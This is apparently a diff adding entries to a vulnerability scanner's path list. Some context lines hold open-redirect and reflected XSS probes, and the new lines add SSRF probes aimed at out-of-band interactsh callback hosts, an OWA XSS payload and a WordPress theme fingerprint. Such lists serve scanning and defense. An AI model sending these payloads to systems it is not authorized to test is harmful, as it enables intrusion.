@@ -202,3 +202,9 @@
 /auth/logout?continue=//example.com
 /lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 /boafrm/formWlanRedirect?redirect-url=http://example.com&wlan_id=1
+/wp-content/themes/bello/readme.txt
+/Images/Remote?imageUrl=https://{{interactsh-url}}/
+/Items/RemoteSearch/Image?ImageUrl=https://{{interactsh-url}}/&ProviderName=TheMovieDB
+/Images/Remote?imageUrl=http://interact.sh/
+/Items/RemoteSearch/Image?ImageUrl=http://interact.sh/&ProviderName=TheMovieDB
+/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};alert(document.domain)//
